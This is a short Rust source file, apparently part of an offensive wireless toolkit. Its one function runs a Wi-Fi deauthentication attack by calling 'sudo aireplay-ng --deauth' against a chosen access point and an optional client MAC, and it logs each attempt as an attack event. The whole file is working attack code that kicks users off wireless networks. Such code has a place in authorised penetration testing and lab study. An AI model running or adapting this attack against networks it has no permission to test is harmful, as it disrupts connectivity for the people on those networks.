use tokio::process::Command;
use colored::Colorize;
use crate::data::logger;

pub async fn run_deauth_attack(interface: &str, ap_bssid: &str, client_mac: Option<&str>, packets: u32) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Starting deauthentication attack on AP '{}' using '{}'...", ap_bssid, interface).blue());
    let mut args = vec![
        "--deauth".to_string(),
        packets.to_string(),
        "-a".to_string(),
        ap_bssid.to_string(),
    ];

    if let Some(mac) = client_mac {
        args.push("-c".to_string());
        args.push(mac.to_string());
    }

    args.push(interface.to_string());

    let mut command = Command::new("sudo");
    command.arg("aireplay-ng").args(&args);

    println!("{}", format!("  Executing: sudo aireplay-ng {}", args.join(" ")).dimmed());

    let output = command.output().await?;

    if output.status.success() {
        println!("{}", "• Deauthentication attack initiated successfully.".green());
        logger::log_attack_event("wifi_deauth", "success", &format!("Deauth attack on {} (client: {:?}) completed.", ap_bssid, client_mac)).await;
    } else {
        eprintln!("{}", "• Deauthentication attack failed.".red());
        eprintln!("  Status: {:?}", output.status);
        eprintln!("  Stdout: {}", String::from_utf8_lossy(&output.stdout));
        eprintln!("  Stderr: {}", String::from_utf8_lossy(&output.stderr));
        logger::log_attack_event("wifi_deauth", "failed", &format!("Deauth attack on {} (client: {:?}) failed: {}", ap_bssid, client_mac, String::from_utf8_lossy(&output.stderr))).await;
    }

    Ok(())
}
